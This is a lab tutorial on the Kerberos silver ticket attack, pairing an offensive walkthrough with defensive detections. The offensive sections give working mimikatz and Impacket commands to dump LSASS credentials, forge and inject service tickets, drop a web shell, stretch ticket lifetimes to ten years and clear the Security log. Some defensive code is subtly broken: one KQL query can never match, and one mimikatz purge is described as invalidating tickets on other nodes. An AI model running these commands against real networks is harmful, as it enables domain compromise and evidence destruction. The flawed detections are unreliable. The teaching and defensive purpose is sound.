# Silver Ticket Attack Chain

Below is a deep-dive into the **Silver Ticket** kill-chain.\
The narrative is split into three parallel tracks so you can run the attack **and** mirror every step with defensive code.\
Read straight through once, then copy-paste the fenced blocks into your own lab—each snippet is self-contained and annotated.

***

### 0. What a Silver Ticket Really Is

Kerberos promises that only the **legitimate service** can decrypt its own ticket because only that service knows its _long-term key_ (NTLM or AES hash).\
A silver ticket simply bypasses the Key Distribution Center (KDC) by forging the _final_ ticket (TGS) offline, encrypting it with a stolen copy of that key.\
No 4768, no AS-REQ, no domain-controller chatter—just a cryptographically valid ticket dropped into memory.\
The result is **direct, stealthy, service-specific access** that appears perfectly genuine to the application.

***

### 1. Impact & Why It Is Still a Problem in 2025

* **Scope**: one service, but usually the _crown-jewel_ service (SQL, CIFS, HOST, HTTP, LDAP).
* **Stealth**: zero DC validation events; only 4624/4672 on the _target server_.
* **Lateral multiplier**: most organizations reuse the same service account for every node (e.g. `svc-SQL`)—break one hash, break the entire tier.
* **Lifetime attacker control**: ticket can be minted for **years** if the hash never changes (manual accounts, gMSA disabled, RC4 still allowed).
* **Blind-spot**: many EDR rules still key on _golden_ ticket anomalies (no 4768, wrong krbtgt encryption) and ignore _silver_ anomalies (no 4769 mismatch, correct service key).

> **Did you know?**\
> A silver ticket does **not** need the domain’s KRBTGT hash, yet with the right SPN list it can still deliver a DA: simply forge `HOST/DC01.corp.local` → `PsExec` → local SYSTEM → dump LSASS → DA hashes.

***

### 2. Offensive Track – Step-by-Step Code

Stage numbers match the headings you supplied; extra micro-steps are inserted so you can copy-paste chronologically.

***

#### Stage 1 – Extract Service Hash (NTLM)

**Scenario**: you already have local admin on `WEB01` where IIS runs under `corp\svc-iis`.

```powershell
# 1-A  Dump LSASS in-proc (EVICTION AVOIDANCE)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Look for:

```
Username  : svc-iis
Domain    : CORP
NTLM      : 9b4f8b473a1c9a5e2d8e7c6f4a3b2e1d
```

> **Tip**: If Credential Guard blocks LSASS, fall back to `sekurlsa::minidump c:\temp\lsass.dmp` taken earlier.

> **Warning**: 4663 on `lsass.exe` plus 4673 (privileged object operation) will fire—expect them.

***

#### Stage 2 – Forge Service Ticket (TGS)

We need four primitives: domain name, domain SID, target SPN, and the service hash we just harvested.

```powershell
# 2-A  Collect domain SID (no privs required)
wmic useraccount where name="%USERNAME%" get sid
# returns S-1-5-21-877193438-1177953900-3661342299
```

```powershell
# 2-B  Mint the silver ticket (offline)
mimikatz # kerberos::golden /domain:corp.local
                             /sid:S-1-5-21-877193438-1177953900-3661342299
                             /rc4:9b4f8b473a1c9a5e2d8e7c6f4a3b2e1d
                             /user:Administrator
                             /id:500
                             /groups:512,518,519
                             /target:WEB01.corp.local
                             /service:HTTP
                             /ptt
```

What happened?

* `/ptt` = inject directly into current logon session.
* No packets to the DC; the ticket is encrypted with the **HTTP service key**—exactly what IIS expects.

> **Did you know?**\
> You can stack multiple services in one command: `/service:HTTP,cifs,HOST,wsmancat` – the generated blob is valid for every SPN sharing the same logon account.

***

#### Stage 3 – Consume the Ticket & Execute

```powershell
# 3-A  Verify we hold the ticket
klist
# Client: Administrator @ CORP.LOCAL
# Server: HTTP/WEB01.corp.local
```

```powershell
# 3-B  Remote service abuse examples
# 3-B-1  WebDAV upload (HTTP)
copy evil.aspx \\WEB01\c$\inetpub\wwwroot\shell.aspx

# 3-B-2  WMI over WinRM (HTTP)
Enter-PSSession -ComputerName WEB01 -UseSSL:$false -Authentication Kerberos

# 3-B-3  SMB lateral (CIFS silver ticket)
dir \\WEB01\c$   # already works because we added /service:cifs
```

> **Tip**: If the back-end service is SQL Server, request an extra TGS:\
> `mimikatz # kerberos::golden ... /service:MSSQLSvc/sql.corp.local:1433 /ptt`

***

#### Stage 4 – Stay Stealthy (Optional but Common)

```powershell
# 4-A  Set lifetime to 10 years (default is 10 hours)
/startoffset:-525600 /endin:5256000 /renewmax:5256000
```

```powershell
# 4-B  Wipe the artefact that betrayed us
mimikatz # event::clear   # clears local Security log
```

> **Warning**: 1102 (audit log cleared) is itself a high-fidelity alert—prefer log injection limits instead.

***

### 3. Defensive Mirror – Detect & Harden in Parallel

For every offensive action above, run the corresponding blue-team snippet **on the same lab box** to see the detection surface.

***

#### Stage 1 – Block Hash Extraction

**A. Isolate LSASS (Win 11 / Server 2022)**

```powershell
# Enable VBS + Credential Guard
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard `
                 -Name EnableVirtualizationBasedSecurity -Value 1
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa `
                 -Name LsaCfgFlags -Value 1
Restart-Computer
```

Result: `sekurlsa::logonpasswords` returns `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`.

**B. Alert on 4663 + PROCESS\_VM\_READ**

```yaml
Sigma rule:
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4663
    ObjectName|endswith: '\lsass.exe'
    AccessMask|contains: '0x1010'  # PROCESS_VM_READ
  condition: selection
```

***

#### Stage 2 – Catch the Forge (No 4768, but Other Tells)

**A. 4769 anomaly pipeline (Sentinel KQL)**

```kusto
let lookback = 2h;
SecurityEvent
| where TimeGenerated > ago(lookback) and EventID == 4769
| extend opts = toint(TicketOptions)
| where (opts & 0x40810010) == 0x40810010   // forwardable, renewable, pre-authent
| summarize Last4768 = maxif(TimeGenerated, EventID == 4768) by AccountName
| where isnull(Last4768)                    // never requested a TGT
| project-reorder AccountName
```

**True positive**: a silver ticket account appears with **zero** preceding 4768.

**B. Check encryption type**

```kusto
| where TicketEncryptionType == "0x17"      // RC4 – still the default for most services
```

Enforce AES-only:

```powershell
Set-ADUser svc-iis -Replace @{'msDS-SupportedEncryptionTypes'=0x18} # AES128+256
```

***

#### Stage 3 – Service-Side Correlation

**A. Compare `LogonSessionID` between 4624 and 4769** Mismatch indicates a ticket injected from another host.

**B. Canary SPN**\
Create a fake SPN under a real account, set a 40-character random password, enable AES-only. Any 4769 for that SPN is impossible in legitimate traffic → instant high-confidence alert.

***

#### Stage 4 – Remediation Playbook (SOAR)

1. Reset the service account **twice** (forces key version increment).
2. Force replication (`repadmin /syncall /AdeP`).
3.  Invalidate outstanding tickets:

    ```powershell
    Invoke-Mimikatz -Command '"kerberos::purge"'   # on each impacted node
    ```
4.  Rotate to gMSA so the password becomes non-manual:

    ```powershell
    New-ADServiceAccount gMSA-iis -DNSHostName gMSA-iis.corp.local -KerberosEncryptionType AES256
    ```
5. Add the account to **Protected Users** if its function allows it (delegation blocked, RC4 refused, ticket lifetime 4 h).

***

### 4. Extra Mile – Cross-Platform Forge

Linux attackers prefer **Impacket’s ticketer.py**:

```bash
# 1. Harvest hash
secretsdump.py corp.local/lowpriv@DC01.corp.local -target-ip 10.0.0.10
# grab svc-iis NTLM

# 2. Forge
ticketer.py -nthash 9b4f8b473a1c9a5e2d8e7c6f4a3b2e1d \
            -domain-sid S-1-5-21-877193438-1177953900-3661342299 \
            -domain corp.local \
            -spn HTTP/WEB01.corp.local \
            -user-id 500 -groups 512,519 \
            Administrator.ccache

# 3. Export & use
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass corp.local/Administrator@WEB01.corp.local
```

> **Did you know?**\
> The resulting `ccache` file is a standard MIT Kerberos credential cache—**valid for Linux, macOS, or Windows** once converted with `kekeo`.

***

### 5. Parting Thoughts

A silver ticket is permission-level malware: it weaponizes **your own Kerberos cryptography** against you. The only long-term fix is to treat **service account hashes** with the same paranoia you reserve for the `KRBTGT` hash: automate rotation, enforce AES, isolate delegation, and hunt for the absence of a preceding 4768. If you cannot stop the hash from leaking, make sure it ages out before the attacker finishes the coffee.
